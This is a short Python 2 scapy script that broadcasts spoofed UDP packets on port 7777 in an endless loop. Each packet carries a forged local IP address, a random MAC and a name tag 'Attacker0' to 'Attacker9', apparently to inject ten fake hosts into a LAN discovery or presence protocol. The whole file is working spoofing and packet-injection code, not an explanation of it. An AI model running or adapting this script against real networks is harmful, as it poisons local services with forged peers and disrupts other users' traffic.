#!/usr/bin/python2

from scapy.all import *
import socket
import random
import time


def gen_data(id):
    a = socket.gethostbyname(socket.gethostname())
    a = map(int,a.split('.'))
    a[-1] = random.randint(0,255)

    ip = ".".join(map(str, a))

    mac = [random.randint(0,255) for i in range(6)]

    a.extend(mac)
    a.extend(map(ord,"Attacker" + str(id)))
    a.append(0)

    a = map(chr, a)
    a = "".join(a)

    return {'ip':ip, 'data':a}

N = 10
data = [gen_data(i) for i in range(N)]

while True:
    for i in data:
        sendp(Ether(dst="ff:ff:ff:ff:ff:ff")/IP(src=i['ip'], dst='255.255.255.255',flags=2,id=37401)/
            UDP(sport=43547, dport=7777)/i['data'],iface='wlp3s0')
    time.sleep(2)